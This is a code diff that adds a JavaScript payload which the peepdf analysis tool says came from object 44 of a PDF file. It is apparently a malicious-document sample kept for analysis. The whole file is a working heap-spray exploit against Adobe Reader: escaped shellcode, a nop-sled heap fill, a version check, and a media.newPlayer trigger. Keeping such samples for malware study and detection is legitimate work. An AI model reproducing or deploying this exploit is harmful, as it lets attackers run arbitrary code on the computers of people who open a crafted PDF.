@@ -1,0 +1,31 @@
+// peepdf comment: Javascript code located in object 44 (version 2)
+
+function sdlfkasdfiasdflaksdflaf(number) {
+    large_hahacode = unescape("%u02ba%u0202%u8002%uffca%u6a42%u5843%ucd52%u5a2e%u053c%uf174%u8042%ufcfa%ueb77%u8fb8%u9050%u4058%u023b%uf075%ue2ff");
+
+    var large_heap = unescape("%u1c1c%u0c1c");
+    while (large_heap.length <= number) large_heap += large_heap;
+    large_heap = large_heap.substring(0, 32768 - large_hahacode.length);
+
+    memory = new Array();
+    for (i = 0; i < 0x1000; i++) {
+        memory[i] = large_heap + large_hahacode;
+    }
+
+    util.printd("1.202116108.345678901.3456: 1.31.34", new Date());
+    util.printd("1.202116108.345678901.3456 : 1.31.34", new Date());
+    try {
+        this.media.newPlayer(null);
+    } catch (e) {}
+    util.printd(unescape("%u0c1c%u0c1c.345678901.345678901.3456 : 1.31.34"), new Date());
+
+    return large_hahacode
+
+}
+
+number = 10000;
+number = number * 3 + 2768;
+var a = app.viewerVersion;
+if ((a >= 8) || (a < 10)) sdlfkasdfiasdflaksdflaf(number)
+else exit();
+
